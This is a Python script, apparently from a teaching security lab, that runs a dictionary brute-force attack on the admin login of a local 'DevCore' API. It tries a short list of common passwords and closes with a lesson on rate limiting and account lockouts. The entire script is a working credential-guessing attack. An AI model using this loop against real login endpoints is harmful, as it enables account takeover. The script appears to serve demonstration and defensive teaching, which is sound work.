import requests
import time
import sys

URL = "http://localhost:5000/api/auth/login"
USERNAME = "admin"

# Wordlist mimicking a hacker's dictionary (like rockyou.txt)
wordlist = [
    "123456",
    "password",
    "root",
    "qwerty",
    "devcore123",
    "superadmin",
    "letmein",
    "admin", # The real password
    "hacker"
]

print("===================================================")
print("  DEVCORE SECURITY LAB: ONLINE API BRUTE-FORCE     ")
print("===================================================")
print(f"Target: {URL}")
print(f"Target Account: '{USERNAME}'")
print("Objective: Guess the password via dictionary attack.\n")

start_time = time.time()
attempts = 0

for pwd in wordlist:
    attempts += 1
    print(f"[*] Sending HTTP POST: username='{USERNAME}', password='{pwd}'...")
    
    try:
        response = requests.post(URL, json={"username": USERNAME, "password": pwd}, timeout=2)
        
        # In DevCore, a successful login returns a token (HTTP 200)
        # A failed login returns HTTP 401 Unauthorized
        if response.status_code == 200:
            elapsed = time.time() - start_time
            print(f"\n[!!!] BREACH SUCCESSFUL! PASSWORD IS: '{pwd}'")
            print(f"Time taken: {elapsed:.4f} seconds")
            print(f"Total HTTP requests: {attempts}")
            print("\nLesson: Online APIs must implement Rate Limiting and Account Lockouts!")
            sys.exit(0)
        elif response.status_code == 500:
            print("  -> [500] Internal Server Error (The server might be crashing!)")
        else:
            print("  -> [401] Access Denied")
            
        # Add a tiny network latency simulation
        time.sleep(0.1)
        
    except requests.exceptions.RequestException as e:
        print(f"  -> Error connecting to API: {e}")
        print("Make sure the DevCore server is running on port 5000!")
        sys.exit(1)

print("\n[X] Dictionary exhausted. Password not found.")
